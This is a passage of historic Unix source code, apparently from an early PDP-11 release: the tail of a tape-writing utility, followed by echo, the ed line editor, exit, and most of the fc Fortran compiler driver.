			bwrite(dbuf);
		}
	}
	if(sz)
		goto pe;
	return;

pe:
	clrbuf(dbuf);
	while(--sz >= 0)
		bwrite(dbuf);
	pher++;
}

bread(bno, b)
{

	seek(fi, bno, 3);
	if(read(fi, b, 512) != 512) {
		printf("read error %l\n", bno);
	}
}

clrbuf(b)
int *b;
{
	register i, *p;

	p = b;
	i = 256;
	while(i--)
		*p++ = 0;
}

swrite(b)
int *b;
{
	register i, s, *p;

	i = 254;
	s = taddr;
	p = b;
	while(i--)
		s =+ *p++;
	*p++ = taddr;
	*p = 031415 - s;
	bwrite(b);
}

bwrite(b)
{

	if(taddr == 0) {
		if(fo != -1) {
			printf("change tapes\n");
			close(fo);
			rdline();
		}
		otape();
	}
wloop:
	if(write(fo, b, 512) != 512) {
		printf("write error\n");
		rdline();
		seek(fo, taddr, 3);
		goto wloop;
	}
	taddr++;
	if(taddr >= tsize)
		taddr = 0;
}

rdline()
{
	int c;

loop:
	c = 0;
	read(0, &c, 1);
	if(c == 0)
		exit();
	if(c != '\n')
		goto loop;
}

number(s)
char *s;
{
	register n, c;

	n = 0;
	while(c = *s++) {
		if(c<'0' || c>'9')
			continue;
		n = n*10+c-'0';
	}
	return(n);
}

size(s0, s1)
{
	register s;
	extern ldivr;

	s = ldiv(s0&0377, s1, 512);
	if(ldivr)
		s++;
	return(s);
}

otape()
{
	register char *p;

	fo = creat(ofile, 0666);
	if(fo < 0) {
		printf("can not open %s\n", ofile);
		exit();
	}
	if(!cflg)
		return;
	p = ofile;
	while(*p++)
		;
	p[-2]++;
}

equal(a, b)
char *a, *b;
{

	while(*a++ == *b)
		if(*b++ == 0)
			return(1);
	return(0);
}
-- /usr/source/s1/echo.c mode=0100664 uid=3 gid=3 atime=174922864 mtime=169260571 --
main(argc, argv)
int argc;
char *argv[];
{
	int i;

	argc--;
	for(i=1; i<=argc; i++)
		printf("%s%c", argv[i], i==argc? '\n': ' ');
}
-- /usr/source/s1/ed.c mode=0110664 uid=3 gid=3 atime=174926983 mtime=174926907 --
#

/*
 * Editor
 */

#define	SIGHUP	1
#define	SIGINTR	2
#define	SIGQUIT	3
#define	FNSIZE	64
#define	LBSIZE	512
#define	ESIZE	128
#define	GBSIZE	256
#define	NBRA	5
#define	EOF	-1

#define	CBRA	1
#define	CCHR	2
#define	CDOT	4
#define	CCL	6
#define	NCCL	8
#define	CDOL	10
#define	CEOF	11
#define	CKET	12

#define	STAR	01

#define	error	goto errlab
#define	READ	0
#define	WRITE	1

int	peekc;
int	lastc;
char	savedfile[FNSIZE];
char	file[FNSIZE];
char	linebuf[LBSIZE];
char	rhsbuf[LBSIZE/2];
char	expbuf[ESIZE+4];
int	circfl;
int	*zero;
int	*dot;
int	*dol;
int	*endcore;
int	*fendcore;
int	*addr1;
int	*addr2;
char	genbuf[LBSIZE];
int	count[2];
char	*nextip;
char	*linebp;
int	ninbuf;
int	io;
int	pflag;
int	onhup;
int	onquit;
int	vflag	1;
int	listf;
int	col;
char	*globp;
int	tfile	-1;
int	tline;
char	*tfname;
char	*loc1;
char	*loc2;
char	*locs;
char	ibuff[512];
int	iblock	-1;
char	obuff[512];
int	oblock	-1;
int	ichanged;
int	nleft;
int	errfunc();
int	*errlab	errfunc;
char	TMPERR[] "TMP";
int	names[26];
char	*braslist[NBRA];
char	*braelist[NBRA];

main(argc, argv)
char **argv;
{
	register char *p1, *p2;
	extern int onintr();

	onquit = signal(SIGQUIT, 1);
	onhup = signal(SIGHUP, 1);
	argv++;
	if (argc > 1 && **argv=='-') {
		vflag = 0;
		/* allow debugging quits? */
		if ((*argv)[1]=='q') {
			signal(SIGQUIT, 0);
			vflag++;
		}
		argv++;
		argc--;
	}
	if (argc>1) {
		p1 = *argv;
		p2 = savedfile;
		while (*p2++ = *p1++);
		globp = "r";
	}
	fendcore = sbrk(0);
	init();
	if ((signal(SIGINTR, 1) & 01) == 0)
		signal(SIGINTR, onintr);
	setexit();
	commands();
	unlink(tfname);
}

commands()
{
	int getfile(), gettty();
	register *a1, c;
	register char *p;
	int r;

	for (;;) {
	if (pflag) {
		pflag = 0;
		addr1 = addr2 = dot;
		goto print;
	}
	addr1 = 0;
	addr2 = 0;
	do {
		addr1 = addr2;
		if ((a1 = address())==0) {
			c = getchar();
			break;
		}
		addr2 = a1;
		if ((c=getchar()) == ';') {
			c = ',';
			dot = a1;
		}
	} while (c==',');
	if (addr1==0)
		addr1 = addr2;
	switch(c) {

	case 'a':
		setdot();
		newline();
		append(gettty, addr2);
		continue;

	case 'c':
		delete();
		append(gettty, addr1-1);
		continue;

	case 'd':
		delete();
		continue;

	case 'e':
		setnoaddr();
		if ((peekc = getchar()) != ' ')
			error;
		savedfile[0] = 0;
		init();
		addr2 = zero;
		goto caseread;

	case 'f':
		setnoaddr();
		if ((c = getchar()) != '\n') {
			peekc = c;
			savedfile[0] = 0;
			filename();
		}
		puts(savedfile);
		continue;

	case 'g':
		global(1);
		continue;

	case 'i':
		setdot();
		nonzero();
		newline();
		append(gettty, addr2-1);
		continue;

	case 'k':
		if ((c = getchar()) < 'a' || c > 'z')
			error;
		newline();
		setdot();
		nonzero();
		names[c-'a'] = *addr2 | 01;
		continue;

	case 'm':
		move(0);
		continue;

	case '\n':
		if (addr2==0)
			addr2 = dot+1;
		addr1 = addr2;
		goto print;

	case 'l':
		listf++;
	case 'p':
		newline();
	print:
		setdot();
		nonzero();
		a1 = addr1;
		do
			puts(getline(*a1++));
		while (a1 <= addr2);
		dot = addr2;
		listf = 0;
		continue;

	case 'q':
		setnoaddr();
		newline();
		unlink(tfname);
		exit();

	case 'r':
	caseread:
		filename();
		if ((io = open(file, 0)) < 0) {
			lastc = '\n';
			error;
		}
		setall();
		ninbuf = 0;
		append(getfile, addr2);
		exfile();
		continue;

	case 's':
		setdot();
		nonzero();
		substitute(globp);
		continue;

	case 't':
		move(1);
		continue;

	case 'v':
		global(0);
		continue;

	case 'w':
		setall();
		nonzero();
		filename();
		if ((io = creat(file, 0666)) < 0)
			error;
		putfile();
		exfile();
		continue;

	case '=':
		setall();
		newline();
		count[1] = (addr2-zero)&077777;
		putd();
		putchar('\n');
		continue;

	case '!':
		unix();
		continue;

	case EOF:
		return;

	}
	error;
	}
}

address()
{
	register *a1, minus, c;
	int n, relerr;

	minus = 0;
	a1 = 0;
	for (;;) {
		c = getchar();
		if ('0'<=c && c<='9') {
			n = 0;
			do {
				n =* 10;
				n =+ c - '0';
			} while ((c = getchar())>='0' && c<='9');
			peekc = c;
			if (a1==0)
				a1 = zero;
			if (minus<0)
				n = -n;
			a1 =+ n;
			minus = 0;
			continue;
		}
		relerr = 0;
		if (a1 || minus)
			relerr++;
		switch(c) {
		case ' ':
		case '\t':
			continue;
	
		case '+':
			minus++;
			if (a1==0)
				a1 = dot;
			continue;

		case '-':
		case '^':
			minus--;
			if (a1==0)
				a1 = dot;
			continue;
	
		case '?':
		case '/':
			compile(c);
			a1 = dot;
			for (;;) {
				if (c=='/') {
					a1++;
					if (a1 > dol)
						a1 = zero;
				} else {
					a1--;
					if (a1 < zero)
						a1 = dol;
				}
				if (execute(0, a1))
					break;
				if (a1==dot)
					error;
			}
			break;
	
		case '$':
			a1 = dol;
			break;
	
		case '.':
			a1 = dot;
			break;

		case '\'':
			if ((c = getchar()) < 'a' || c > 'z')
				error;
			for (a1=zero; a1<=dol; a1++)
				if (names[c-'a'] == (*a1|01))
					break;
			break;
	
		default:
			peekc = c;
			if (a1==0)
				return(0);
			a1 =+ minus;
			if (a1<zero || a1>dol)
				error;
			return(a1);
		}
		if (relerr)
			error;
	}
}

setdot()
{
	if (addr2 == 0)
		addr1 = addr2 = dot;
	if (addr1 > addr2)
		error;
}

setall()
{
	if (addr2==0) {
		addr1 = zero+1;
		addr2 = dol;
		if (dol==zero)
			addr1 = zero;
	}
	setdot();
}

setnoaddr()
{
	if (addr2)
		error;
}

nonzero()
{
	if (addr1<=zero || addr2>dol)
		error;
}

newline()
{
	register c;

	if ((c = getchar()) == '\n')
		return;
	if (c=='p' || c=='l') {
		pflag++;
		if (c=='l')
			listf++;
		if (getchar() == '\n')
			return;
	}
	error;
}

filename()
{
	register char *p1, *p2;
	register c;

	count[1] = 0;
	c = getchar();
	if (c=='\n' || c==EOF) {
		p1 = savedfile;
		if (*p1==0)
			error;
		p2 = file;
		while (*p2++ = *p1++);
		return;
	}
	if (c!=' ')
		error;
	while ((c = getchar()) == ' ');
	if (c=='\n')
		error;
	p1 = file;
	do {
		*p1++ = c;
	} while ((c = getchar()) != '\n');
	*p1++ = 0;
	if (savedfile[0]==0) {
		p1 = savedfile;
		p2 = file;
		while (*p1++ = *p2++);
	}
}

exfile()
{
	close(io);
	io = -1;
	if (vflag) {
		putd();
		putchar('\n');
	}
}

onintr()
{
	signal(SIGINTR, onintr);
	putchar('\n');
	lastc = '\n';
	error;
}

errfunc()
{
	register c;

	listf = 0;
	puts("?");
	count[0] = 0;
	seek(0, 0, 2);
	pflag = 0;
	if (globp)
		lastc = '\n';
	globp = 0;
	peekc = lastc;
	while ((c = getchar()) != '\n' && c != EOF);
	if (io > 0) {
		close(io);
		io = -1;
	}
	reset();
}

getchar()
{
	if (lastc=peekc) {
		peekc = 0;
		return(lastc);
	}
	if (globp) {
		if ((lastc = *globp++) != 0)
			return(lastc);
		globp = 0;
		return(EOF);
	}
	if (read(0, &lastc, 1) <= 0)
		return(lastc = EOF);
	lastc =& 0177;
	return(lastc);
}

gettty()
{
	register c, gf;
	register char *p;

	p = linebuf;
	gf = globp;
	while ((c = getchar()) != '\n') {
		if (c==EOF) {
			if (gf)
				peekc = c;
			return(c);
		}
		if ((c =& 0177) == 0)
			continue;
		*p++ = c;
		if (p >= &linebuf[LBSIZE-2])
			error;
	}
	*p++ = 0;
	if (linebuf[0]=='.' && linebuf[1]==0)
		return(EOF);
	return(0);
}

getfile()
{
	register c;
	register char *lp, *fp;

	lp = linebuf;
	fp = nextip;
	do {
		if (--ninbuf < 0) {
			if ((ninbuf = read(io, genbuf, LBSIZE)-1) < 0)
				return(EOF);
			fp = genbuf;
		}
		if (lp >= &linebuf[LBSIZE])
			error;
		if ((*lp++ = c = *fp++ & 0177) == 0) {
			lp--;
			continue;
		}
		if (++count[1] == 0)
			++count[0];
	} while (c != '\n');
	*--lp = 0;
	nextip = fp;
	return(0);
}

putfile()
{
	int *a1;
	register char *fp, *lp;
	register nib;

	nib = 512;
	fp = genbuf;
	a1 = addr1;
	do {
		lp = getline(*a1++);
		for (;;) {
			if (--nib < 0) {
				write(io, genbuf, fp-genbuf);
				nib = 511;
				fp = genbuf;
			}
			if (++count[1] == 0)
				++count[0];
			if ((*fp++ = *lp++) == 0) {
				fp[-1] = '\n';
				break;
			}
		}
	} while (a1 <= addr2);
	write(io, genbuf, fp-genbuf);
}

append(f, a)
int (*f)();
{
	register *a1, *a2, *rdot;
	int nline, tl;
	struct { int integer; };

	nline = 0;
	dot = a;
	while ((*f)() == 0) {
		if (dol >= endcore) {
			if (sbrk(1024) == -1)
				error;
			endcore.integer =+ 1024;
		}
		tl = putline();
		nline++;
		a1 = ++dol;
		a2 = a1+1;
		rdot = ++dot;
		while (a1 > rdot)
			*--a2 = *--a1;
		*rdot = tl;
	}
	return(nline);
}

unix()
{
	register savint, pid, rpid;
	int retcode;

	setnoaddr();
	if ((pid = fork()) == 0) {
		signal(SIGHUP, onhup);
		signal(SIGQUIT, onquit);
		execl("/bin/sh", "sh", "-t", 0);
		exit();
	}
	savint = signal(SIGINTR, 1);
	while ((rpid = wait(&retcode)) != pid && rpid != -1);
	signal(SIGINTR, savint);
	puts("!");
}

delete()
{
	register *a1, *a2, *a3;

	setdot();
	newline();
	nonzero();
	a1 = addr1;
	a2 = addr2+1;
	a3 = dol;
	dol =- a2 - a1;
	do
		*a1++ = *a2++;
	while (a2 <= a3);
	a1 = addr1;
	if (a1 > dol)
		a1 = dol;
	dot = a1;
}

getline(tl)
{
	register char *bp, *lp;
	register nl;

	lp = linebuf;
	bp = getblock(tl, READ);
	nl = nleft;
	tl =& ~0377;
	while (*lp++ = *bp++)
		if (--nl == 0) {
			bp = getblock(tl=+0400, READ);
			nl = nleft;
		}
	return(linebuf);
}

putline()
{
	register char *bp, *lp;
	register nl;
	int tl;

	lp = linebuf;
	tl = tline;
	bp = getblock(tl, WRITE);
	nl = nleft;
	tl =& ~0377;
	while (*bp = *lp++) {
		if (*bp++ == '\n') {
			*--bp = 0;
			linebp = lp;
			break;
		}
		if (--nl == 0) {
			bp = getblock(tl=+0400, WRITE);
			nl = nleft;
		}
	}
	nl = tline;
	tline =+ (((lp-linebuf)+03)>>1)&077776;
	return(nl);
}

getblock(atl, iof)
{
	extern read(), write();
	register bno, off;
	
	bno = (atl>>8)&0377;
	off = (atl<<1)&0774;
	if (bno >= 255) {
		puts(TMPERR);
		error;
	}
	nleft = 512 - off;
	if (bno==iblock) {
		ichanged =| iof;
		return(ibuff+off);
	}
	if (bno==oblock)
		return(obuff+off);
	if (iof==READ) {
		if (ichanged)
			blkio(iblock, ibuff, write);
		ichanged = 0;
		iblock = bno;
		blkio(bno, ibuff, read);
		return(ibuff+off);
	}
	if (oblock>=0)
		blkio(oblock, obuff, write);
	oblock = bno;
	return(obuff+off);
}

blkio(b, buf, iofcn)
int (*iofcn)();
{
	seek(tfile, b, 3);
	if ((*iofcn)(tfile, buf, 512) != 512) {
		puts(TMPERR);
		error;
	}
}

init()
{
	register char *p;
	register pid;

	close(tfile);
	tline = 0;
	iblock = -1;
	oblock = -1;
	tfname = "/tmp/exxxxx";
	ichanged = 0;
	pid = getpid();
	for (p = &tfname[11]; p > &tfname[6];) {
		*--p = (pid&07) + '0';
		pid =>> 3;
	}
	close(creat(tfname, 0600));
	tfile = open(tfname, 2);
	brk(fendcore);
	dot = zero = dol = fendcore;
	endcore = fendcore - 2;
}

global(k)
{
	register char *gp;
	register c;
	register int *a1;
	char globuf[GBSIZE];

	if (globp)
		error;
	setall();
	nonzero();
	if ((c=getchar())=='\n')
		error;
	compile(c);
	gp = globuf;
	while ((c = getchar()) != '\n') {
		if (c==EOF)
			error;
		if (c=='\\') {
			c = getchar();
			if (c!='\n')
				*gp++ = '\\';
		}
		*gp++ = c;
		if (gp >= &globuf[GBSIZE-2])
			error;
	}
	*gp++ = '\n';
	*gp++ = 0;
	for (a1=zero; a1<=dol; a1++) {
		*a1 =& ~01;
		if (a1>=addr1 && a1<=addr2 && execute(0, a1)==k)
			*a1 =| 01;
	}
	for (a1=zero; a1<=dol; a1++) {
		if (*a1 & 01) {
			*a1 =& ~01;
			dot = a1;
			globp = globuf;
			commands();
			a1 = zero;
		}
	}
}

substitute(inglob)
{
	register gsubf, *a1, nl;
	int getsub();

	gsubf = compsub();
	for (a1 = addr1; a1 <= addr2; a1++) {
		if (execute(0, a1)==0)
			continue;
		inglob =| 01;
		dosub();
		if (gsubf) {
			while (*loc2) {
				if (execute(1)==0)
					break;
				dosub();
			}
		}
		*a1 = putline();
		nl = append(getsub, a1);
		a1 =+ nl;
		addr2 =+ nl;
	}
	if (inglob==0)
		error;
}

compsub()
{
	register seof, c;
	register char *p;
	int gsubf;

	if ((seof = getchar()) == '\n')
		error;
	compile(seof);
	p = rhsbuf;
	for (;;) {
		c = getchar();
		if (c=='\\')
			c = getchar() | 0200;
		if (c=='\n')
			error;
		if (c==seof)
			break;
		*p++ = c;
		if (p >= &rhsbuf[LBSIZE/2])
			error;
	}
	*p++ = 0;
	if ((peekc = getchar()) == 'g') {
		peekc = 0;
		newline();
		return(1);
	}
	newline();
	return(0);
}

getsub()
{
	register char *p1, *p2;

	p1 = linebuf;
	if ((p2 = linebp) == 0)
		return(EOF);
	while (*p1++ = *p2++);
	linebp = 0;
	return(0);
}

dosub()
{
	register char *lp, *sp, *rp;
	int c;

	lp = linebuf;
	sp = genbuf;
	rp = rhsbuf;
	while (lp < loc1)
		*sp++ = *lp++;
	while (c = *rp++) {
		if (c=='&') {
			sp = place(sp, loc1, loc2);
			continue;
		} else if (c<0 && (c =& 0177) >='1' && c < NBRA+'1') {
			sp = place(sp, braslist[c-'1'], braelist[c-'1']);
			continue;
		}
		*sp++ = c&0177;
		if (sp >= &genbuf[LBSIZE])
			error;
	}
	lp = loc2;
	loc2 = sp + linebuf - genbuf;
	while (*sp++ = *lp++)
		if (sp >= &genbuf[LBSIZE])
			error;
	lp = linebuf;
	sp = genbuf;
	while (*lp++ = *sp++);
}

place(asp, al1, al2)
{
	register char *sp, *l1, *l2;

	sp = asp;
	l1 = al1;
	l2 = al2;
	while (l1 < l2) {
		*sp++ = *l1++;
		if (sp >= &genbuf[LBSIZE])
			error;
	}
	return(sp);
}

move(cflag)
{
	register int *adt, *ad1, *ad2;
	int getcopy();

	setdot();
	nonzero();
	if ((adt = address())==0)
		error;
	newline();
	ad1 = addr1;
	ad2 = addr2;
	if (cflag) {
		ad1 = dol;
		append(getcopy, ad1++);
		ad2 = dol;
	}
	ad2++;
	if (adt<ad1) {
		dot = adt + (ad2-ad1);
		if ((++adt)==ad1)
			return;
		reverse(adt, ad1);
		reverse(ad1, ad2);
		reverse(adt, ad2);
	} else if (adt >= ad2) {
		dot = adt++;
		reverse(ad1, ad2);
		reverse(ad2, adt);
		reverse(ad1, adt);
	} else
		error;
}

reverse(aa1, aa2)
{
	register int *a1, *a2, t;

	a1 = aa1;
	a2 = aa2;
	for (;;) {
		t = *--a2;
		if (a2 <= a1)
			return;
		*a2 = *a1;
		*a1++ = t;
	}
}

getcopy()
{
	if (addr1 > addr2)
		return(EOF);
	getline(*addr1++);
	return(0);
}

compile(aeof)
{
	register eof, c;
	register char *ep;
	char *lastep;
	char bracket[NBRA], *bracketp;
	int nbra;
	int cclcnt;

	ep = expbuf;
	eof = aeof;
	bracketp = bracket;
	nbra = 0;
	if ((c = getchar()) == eof) {
		if (*ep==0)
			error;
		return;
	}
	circfl = 0;
	if (c=='^') {
		c = getchar();
		circfl++;
	}
	if (c=='*')
		goto cerror;
	peekc = c;
	for (;;) {
		if (ep >= &expbuf[ESIZE])
			goto cerror;
		c = getchar();
		if (c==eof) {
			*ep++ = CEOF;
			return;
		}
		if (c!='*')
			lastep = ep;
		switch (c) {

		case '\\':
			if ((c = getchar())=='(') {
				if (nbra >= NBRA)
					goto cerror;
				*bracketp++ = nbra;
				*ep++ = CBRA;
				*ep++ = nbra++;
				continue;
			}
			if (c == ')') {
				if (bracketp <= bracket)
					goto cerror;
				*ep++ = CKET;
				*ep++ = *--bracketp;
				continue;
			}
			*ep++ = CCHR;
			if (c=='\n')
				goto cerror;
			*ep++ = c;
			continue;

		case '.':
			*ep++ = CDOT;
			continue;

		case '\n':
			goto cerror;

		case '*':
			if (*lastep==CBRA || *lastep==CKET)
				error;
			*lastep =| STAR;
			continue;

		case '$':
			if ((peekc=getchar()) != eof)
				goto defchar;
			*ep++ = CDOL;
			continue;

		case '[':
			*ep++ = CCL;
			*ep++ = 0;
			cclcnt = 1;
			if ((c=getchar()) == '^') {
				c = getchar();
				ep[-2] = NCCL;
			}
			do {
				if (c=='\n')
					goto cerror;
				*ep++ = c;
				cclcnt++;
				if (ep >= &expbuf[ESIZE])
					goto cerror;
			} while ((c = getchar()) != ']');
			lastep[1] = cclcnt;
			continue;

		defchar:
		default:
			*ep++ = CCHR;
			*ep++ = c;
		}
	}
   cerror:
	expbuf[0] = 0;
	error;
}

execute(gf, addr)
int *addr;
{
	register char *p1, *p2, c;

	if (gf) {
		if (circfl)
			return(0);
		p1 = linebuf;
		p2 = genbuf;
		while (*p1++ = *p2++);
		locs = p1 = loc2;
	} else {
		if (addr==zero)
			return(0);
		p1 = getline(*addr);
		locs = 0;
	}
	p2 = expbuf;
	if (circfl) {
		loc1 = p1;
		return(advance(p1, p2));
	}
	/* fast check for first character */
	if (*p2==CCHR) {
		c = p2[1];
		do {
			if (*p1!=c)
				continue;
			if (advance(p1, p2)) {
				loc1 = p1;
				return(1);
			}
		} while (*p1++);
		return(0);
	}
	/* regular algorithm */
	do {
		if (advance(p1, p2)) {
			loc1 = p1;
			return(1);
		}
	} while (*p1++);
	return(0);
}

advance(alp, aep)
{
	register char *lp, *ep, *curlp;
	char *nextep;

	lp = alp;
	ep = aep;
	for (;;) switch (*ep++) {

	case CCHR:
		if (*ep++ == *lp++)
			continue;
		return(0);

	case CDOT:
		if (*lp++)
			continue;
		return(0);

	case CDOL:
		if (*lp==0)
			continue;
		return(0);

	case CEOF:
		loc2 = lp;
		return(1);

	case CCL:
		if (cclass(ep, *lp++, 1)) {
			ep =+ *ep;
			continue;
		}
		return(0);

	case NCCL:
		if (cclass(ep, *lp++, 0)) {
			ep =+ *ep;
			continue;
		}
		return(0);

	case CBRA:
		braslist[*ep++] = lp;
		continue;

	case CKET:
		braelist[*ep++] = lp;
		continue;

	case CDOT|STAR:
		curlp = lp;
		while (*lp++);
		goto star;

	case CCHR|STAR:
		curlp = lp;
		while (*lp++ == *ep);
		ep++;
		goto star;

	case CCL|STAR:
	case NCCL|STAR:
		curlp = lp;
		while (cclass(ep, *lp++, ep[-1]==(CCL|STAR)));
		ep =+ *ep;
		goto star;

	star:
		do {
			lp--;
			if (lp==locs)
				break;
			if (advance(lp, ep))
				return(1);
		} while (lp > curlp);
		return(0);

	default:
		error;
	}
}

cclass(aset, ac, af)
{
	register char *set, c;
	register n;

	set = aset;
	if ((c = ac) == 0)
		return(0);
	n = *set++;
	while (--n)
		if (*set++ == c)
			return(af);
	return(!af);
}

putd()
{
	register r;
	extern ldivr;

	count[1] = ldiv(count[0], count[1], 10);
	count[0] = 0;
	r = ldivr;
	if (count[1])
		putd();
	putchar(r + '0');
}

puts(as)
{
	register char *sp;

	sp = as;
	col = 0;
	while (*sp)
		putchar(*sp++);
	putchar('\n');
}

char	line[70];
char	*linp	line;

putchar(ac)
{
	register char *lp;
	register c;

	lp = linp;
	c = ac;
	if (listf) {
		col++;
		if (col >= 72) {
			col = 0;
			*lp++ = '\\';
			*lp++ = '\n';
		}
		if (c=='\t') {
			c = '>';
			goto esc;
		}
		if (c=='\b') {
			c = '<';
		esc:
			*lp++ = '-';
			*lp++ = '\b';
			*lp++ = c;
			goto out;
		}
		if (c<' ' && c!= '\n') {
			*lp++ = '\\';
			*lp++ = (c>>3)+'0';
			*lp++ = (c&07)+'0';
			col =+ 2;
			goto out;
		}
	}
	*lp++ = c;
out:
	if(c == '\n' || lp >= &line[64]) {
		linp = line;
		write(1, line, lp-line);
		return;
	}
	linp = lp;
}

/*
 * Get process ID routine if system call is unavailable.
getpid()
{
	register f;
	int b[1];

	f = open("/dev/kmem", 0);
	if(f < 0)
		return(-1);
	seek(f, 0140074, 0);
	read(f, b, 2);
	seek(f, b[0]+8, 0);
	read(f, b, 2);
	close(f);
	return(b[0]);
}
 */
-- /usr/source/s1/exit.c mode=0100664 uid=3 gid=3 atime=174922884 mtime=169260571 --
/* exit -- end runcom */

main() {
	seek(0, 0, 2);
}
-- /usr/source/s1/fc.c mode=0110664 uid=3 gid=3 atime=174922895 mtime=169260571 --
/* Fortran command */

char	*tmp;
char ts[1000];
char *tsp ts;
char *av[50];
char *clist[50];
char *llist[50];
int instring;
int pflag;
int cflag;
char	*complr;
int *ibuf;
int *ibuf1;
int *ibuf2;
int *obuf;
char *lp;
char *line;
int lineno;
int exfail;
struct symtab {
	char name[8];
	char *value;
} *symtab;
int symsiz 200;
struct symtab *defloc;
struct symtab *incloc;
char *stringbuf;

main(argc, argv)
char *argv[]; {
	char *t;
	int nc, nl, i, j, c, nxo;
	int dexit();

	complr = "/usr/fort/fc1";
	i = nc = nl = nxo = 0;
	while(++i < argc) {
		if(*argv[i] == '-')
			switch (argv[i][1]) {
				default:
					goto passa;
				case 'p':
					pflag++;
				case 'c':
					cflag++;
					break;
				case '2':
					complr = "/usr/fort/fc2";
					break;
			}
		else {
		passa:
			t = argv[i];
			if(getsuf(t)=='f') {
				clist[nc++] = t;
				t = setsuf(copy(t), 'o');
			}
			if (nodup(llist, t)) {
				llist[nl++] = t;
				if (getsuf(t)=='o')
					nxo++;
			}
		}
	}
	if(nc==0)
		goto nocom;
	if ((signal(2, 1) & 01) == 0)
		signal(2, &dexit);
	for (i=0; i<nc; i++) {
		if (nc>1)
			printf("%s:\n", clist[i]);
		tmp = 0;
		av[0] = complr;
		av[1] = expand(clist[i]);
		if (pflag || exfail)
			continue;
		if (av[1] == 0) {
			cflag++;
			continue;
		}
		av[2] = 0;
		t = callsys(complr, av);
		if(tmp)
			cunlink(tmp);
		if(t) {
			cflag++;
			continue;
		}
		av[0] = "as";
		av[1] = "-";
		av[2] = "f.tmp1";
		av[3] = 0;
		callsys("/bin/as", av);
		t = setsuf(clist[i], 'o');
		cunlink(t);
		if(link("a.out", t) || cunlink("a.out")) {
			printf("move failed: %s\n", t);
			cflag++;
		}
	}
nocom:
	if (cflag==0 && nl!=0) {
		i = 0;
		av[0] = "ld";
		av[1] = "-x";
		av[2] = "/lib/fr0.o";
		j = 3;
		while(i<nl)
			av[j++] = llist[i++];
		av[j++] = "-lf";
		av[j++] = "/lib/filib.a";
		av[j++] = "-l";
		av[j++] = 0;
		callsys("/bin/ld", av);
		if (nc==1 && nxo==1)
			cunlink(setsuf(clist[0], 'o'));
	}
	dexit();
}

dexit()
{
	unlink("f.tmp1");
	exit();
}

expand(file)
char *file;
{
	int ib1[259], ib2[259], ob[259];
	struct symtab stab[200];
	char ln[196], sbf[1024];
	int c;

	exfail = 0;
	ibuf = ibuf1 = ib1;
	ibuf2 = ib2;
	if (fopen(file, ibuf1)<0)
		return(file);
	if (getc(ibuf1) != '#') {
		close(ibuf1[0]);
		return(file);
	}
	ibuf1[1]++;
	ibuf1[2]--;
	obuf = ob;
	symtab = stab;
	for (c=0; c<200; c++) {
		stab[c].name[0] = '\0';
		stab[c].value = 0;
	}
	defloc = lookup("define", 1);
	defloc->value = defloc->name;
	incloc = lookup("include", 1);
	incloc->value = incloc->name;
	stringbuf = sbf;
	line  = ln;
	lineno = 0;
	tmp = setsuf(copy(file), 'i');
	if (fcreat(tmp, obuf) < 0) {
		printf("Can't creat %s\n", tmp);
		dexit();
	}
	while(getline()) {
/*
		if (ibuf==ibuf2)
			putc(001, obuf);	/*SOH: insert */
		if (ln[0] != '#')
			for (lp=line; *lp!='\0'; lp++)
				putc(*lp, obuf);
		putc('\n', obuf);
	}
	fflush(obuf);
	close(obuf[0]);
	close(ibuf1[0]);
	return(tmp);
}

getline()
{
	int c, sc, state;
	struct symtab *np;
	char *namep, *filname;

	if (ibuf==ibuf1)
		lineno++;
	lp = line;
	*lp = '\0';
	state = 0;
	if ((c=getch()) == '#')
		state = 1;
	while (c!='\n' && c!='\0') {
		if ('a'<=c && c<='z' || 'A'<=c && c<='Z' || c=='_') {
			namep = lp;
			sch(c);
			while ('a'<=(c=getch()) && c<='z'
			      ||'A'<=c && c<='Z'
			      ||'0'<=c && c<='9' 
			      ||c=='_')
				sch(c);
			sch('\0');
			lp--;
			np = lookup(namep, state);
			if (state==1) {
				if (np==defloc)
					state = 2;
				else if (np==incloc)
					state = 3;
				else {
					error("Undefined control");
					while (c!='\n' && c!='\0')
						c = getch();
					return(c);
				}
			} else if (state==2) {
				np->value = stringbuf;
				while ((c=getch())!='\n' && c!='\0')
					savch(c);
				savch('\0');
				return(1);
			}
			continue;
		} else if ((sc=c)=='\'' || sc=='"') {
			sch(sc);
			filname = lp;
			instring++;
			while ((c=getch())!=sc && c!='\n' && c!='\0') {
				sch(c);
				if (c=='\\')
					sch(getch());
			}
			instring = 0;
			if (state==3) {
				*lp = '\0';
				while ((c=getch())!='\n' && c!='\0');
				if (ibuf==ibuf2)
					error("Nested 'include'");
				if (fopen(filname, ibuf2)<0)
					error("Missing file %s", filname);
				else
					ibuf = ibuf2;
				return(c);
			}
		}
		sch(c);
		c = getch();
	}
	sch('\0');
	if (state>1)
		error("Control syntax");
	return(c);
}

error(s, x)
{
	printf("%d: ", lineno);
	printf(s, x);
	putchar('\n');
	exfail++;
	cflag++;
}

sch(c)
{
	if (lp==line+194)
		error("Line overflow");
	*lp++ = c;
	if (lp>line+195)
		lp = line+195;
}

savch(c)
{
	*stringbuf++ = c;
}

getch()
{
	static peekc;
	int c;

	if (peekc) {
		c = peekc;
		peekc = 0;
		return(c);
	}
loop:
	if ((c=getc1())=='/' && !instring) {
		if ((peekc=getc1())!='*')
			return('/');
		peekc = 0;
		for(;;) {
			c = getc1();
		cloop:
			switch (c) {

			case '\0':
				return('\0');

			case '*':
				if ((c=getc1())=='/')
					goto loop;
				goto cloop;

			case '\n':
				if (ibuf==ibuf1) {
					putc('\n', obuf);
					lineno++;
				}
				continue;
			}
		}
	}
	return(c);
}

getc1()
{
	int c;

	if ((c = getc(ibuf)) < 0 && ibuf==ibuf2) {
		close(ibuf2[0]);
		ibuf = ibuf1;
		putc('\n', obuf);
		c = getc1();
	}
	if (c<0)
		return(0);
	return(c);
}

lookup(namep, enterf)
char *namep;
{
	char *np, *snp;
	struct symtab *sp;
	int i, c;

	np = namep;
	i = 0;
	while (c = *np++)
		i =+ c;
	i =% symsiz;
	sp = &symtab[i];
	while (sp->name[0]) {
		snp = sp;
		np = namep;
		while (*snp++ == *np)
			if (*np++ == '\0' || np==namep+8) {
				if (!enterf)
					subst(namep, sp);
				return(sp);
			}
		if (sp++ > &symtab[symsiz])
			sp = symtab;
	}
	if (enterf) {
		for (i=0; i<8; i++)
			if (sp->name[i] = *namep)
				namep++;
		while (*namep)
			namep++;
	}
	return(sp);
}

subst(np, sp)
char *np;
struct symtab *sp;
{
	char *vp;

	lp = np;
	if ((vp = sp->value) == 0)
		return;
	sch(' ');
	while (*vp)
		sch(*vp++);
	sch(' ');
}

getsuf(s)
char s[];
{
	int c;
